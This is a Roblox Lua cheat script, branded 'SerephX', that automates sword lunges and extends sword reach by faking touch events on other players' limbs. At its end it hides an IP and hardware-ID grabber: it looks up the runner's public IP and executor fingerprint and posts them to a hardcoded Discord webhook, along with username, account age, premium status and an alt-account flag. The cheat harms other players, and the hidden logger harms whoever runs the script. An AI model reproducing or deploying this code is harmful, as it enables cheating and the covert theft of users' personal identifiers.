local ClickRate = 0.5/25 --1/fps
local Keybind = Enum.KeyCode.Q
 
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
 
local Player = Players.LocalPlayer
local ACing,AI,Lunging = false,false,{}
setmetatable(Lunging, {__mode = "kv"})
local Sword
local AFK = false
local function Lunge(CSword)
	if not Lunging[CSword] and CSword == Sword then
		Lunging[CSword] = true
		local Lunged = false
		local Con = Sword.ChildAdded:Connect(function(i)
			if i.Name == 'toolanim' and i.Value == 'Lunge' then
				Lunged = true
			end
		end)
		repeat
			CSword:Activate()
			local t = tick()
			repeat RS.RenderStepped:Wait() until tick() - t > ClickRate
		until CSword ~= Sword or Lunged or not CSword
		Con:Disconnect()
	end
end
local function Toggle()
	ACing = not ACing
	if ACing and Sword then
		Lunge(Sword)
	end
end
UIS.InputBegan:Connect(function(k,g)
	if not g and k.KeyCode == Keybind then
		Toggle()
	end
end)
 
local SwordConnections = {}
setmetatable(SwordConnections, {__mode = "kv"})
local function AddSwordConnection(CSword)
	if not SwordConnections[CSword] then
		SwordConnections[CSword] = true
		CSword:GetPropertyChangedSignal("Grip"):Connect(function()
			local G = CSword.GripUp.Z
			if G == 1 then
				Lunging[CSword] = nil
				if not AFK and ACing and Sword and CSword and Sword == CSword then
					Lunge(CSword)
				end				
			end
		end)
		CSword.Equipped:Connect(function()
			if ACing then
				wait()
				Lunge(CSword)
			end
		end)
	end
end
 
local function onCharAdded(Char)
	Sword = Char:FindFirstChildOfClass("Tool")
	Char.ChildAdded:Connect(function(i)
		if i.ClassName == 'Tool' then
			Sword = i
			AddSwordConnection(Sword)
		end
	end)
	Char.ChildRemoved:Connect(function(i)
		if Sword == i then
			Sword = nil
		end
	end)
end
Player.CharacterAdded:Connect(onCharAdded)
if Player.Character then
	onCharAdded(Player.Character)
end
UIS.WindowFocused:connect(function() AFK = false end)
UIS.WindowFocusReleased:connect(function() AFK = true end)
 
 
local on = true
local distance = 5
_G.SphereActivated = false
 
local starterGui = game:GetService("StarterGui")
local plr = game:GetService('Players').LocalPlayer
local cooldown = false
game:GetService('RunService').Heartbeat:connect(function()
    if on then
    local hum = plr.Character.Humanoid
        for _,v in ipairs(game.Players:GetPlayers()) do
            if v.Name ~= plr.Name then
                local s,e = pcall(function()
                    local root = v.Character.HumanoidRootPart
                local torso = v.Character.Torso
            local RightArm = v.Character:FindFirstChild('Right Arm')
            local LeftArm = v.Character:FindFirstChild('Left Arm')
            local RightLeg = v.Character:FindFirstChild('Right Leg')
            local LeftLeg = v.Character:FindFirstChild('Left Leg')
                    local sword = hum.Parent:FindFirstChildOfClass('Tool')
                    if sword and (root.Position - sword.Handle.Position).Magnitude <= distance and Sword.GripUp.Z == 0 then 
                         if cooldown == false then
                        cooldown = true
                        firetouchinterest(sword.Handle, root, 0)

            firetouchinterest(sword.Handle, torso, 0)

            firetouchinterest(sword.Handle, RightArm, 0)

            firetouchinterest(sword.Handle, LeftArm, 0)

	        firetouchinterest(sword.Handle, RightLeg, 0)

	        firetouchinterest(sword.Handle, LeftLeg, 0)
            wait()
            firetouchinterest(sword.Handle, root, 1)
            wait()
            firetouchinterest(sword.Handle, torso, 1)
            wait()
            firetouchinterest(sword.Handle, RightArm, 1)
            wait()
            firetouchinterest(sword.Handle, LeftArm, 1)
            wait()
            firetouchinterest(sword.Handle, RightLeg, 1)
            wait()
            firetouchinterest(sword.Handle, LeftLeg, 1)
            wait()
                        cooldown = false
                        end
                    end
                end)
            end
        end
    end
end)
local is_on = function()
    return on and 'on' or 'off'
end
 
local mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
    if key == 'p' then
        on = not on
    elseif key == ';' then
        local status = is_on()
        starterGui:SetCore('SendNotification', {Title = '不SerephX不', Text = 'Exploit is '..status..'. Current: '.. distance..' studs'})
    elseif key == "," then
        distance = distance - 1
        starterGui:SetCore("SendNotification", {Title = "不SerephX不", Text = "Reach Strength has increased by 1. Current: " .. distance..' studs'})
    elseif key == "." then
        if distance < 20 then
            distance = distance + 1
            starterGui:SetCore("SendNotification", {Title = "不SerephX不", Text = "Reach Strength has decreased by 1. Current: " .. distance..' studs'})
        else
            starterGui:SetCore("SendNotification", {Title = "不SerephX不", Text = "Cannot Increase any further!"})
        end
    end
end)
 
 
if _G.SphereActivated then
function Update()
    game.Players.LocalPlayer.Character.ChildAdded:Connect(function(tool)
        if tool:FindFirstChild("Handle") then
        Part = Instance.new("Part")
        Weld = Instance.new("Weld", workspace)
        Part.Parent = workspace
        Part.Transparency = 1
        Part.CanCollide = false
        Sphere = Instance.new("SelectionSphere",game:GetService("CoreGui").RobloxGui.Modules)
        Sphere.Transparency = 1 
        Sphere.SurfaceColor3 = Color3.new(255,0,0)
        Sphere.Name = "Sphere"
        Sphere.SurfaceTransparency = .5
        Sphere.Adornee = Part 
        Part.Massless = true
        Part.Position = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position
        Weld.Part0 = Part 
        Weld.Part1 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle
         game:GetService("RunService").Stepped:Connect(function()
         Part.Size = Vector3.new(distance,distance,distance)
         end)
      end
    end)
  end
function UnEquip()
    game.Players.LocalPlayer.Character.ChildRemoved:Connect(function(int)
        if int:FindFirstChild("Handle") then
            for i,v in pairs(game:GetService("CoreGui").RobloxGui.Modules:GetDescendants()) do 
                if v.Name == 'Sphere' then
                    v:Destroy()
                end
            end
        end
    end)
end
 
 
 
Update()
UnEquip()
 
game.Players.LocalPlayer.CharacterAdded:Connect(Update)
game.Players.LocalPlayer.CharacterAdded:Connect(UnEquip)    
end
local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end
 
local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 
 
local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end
 
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";
 
for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end
 
if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discordapp.com/api/webhooks/781584039453786122/OaijHvtQ6KkFf2WLICnD3mm9BMN67fE4qpUL03cPBRraFBPo09hfHhECgK0xOD1WmZA0"
 
 
local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
 
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
 
    local headers = {
            ["content-type"] = "application/json"
    }
 
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end
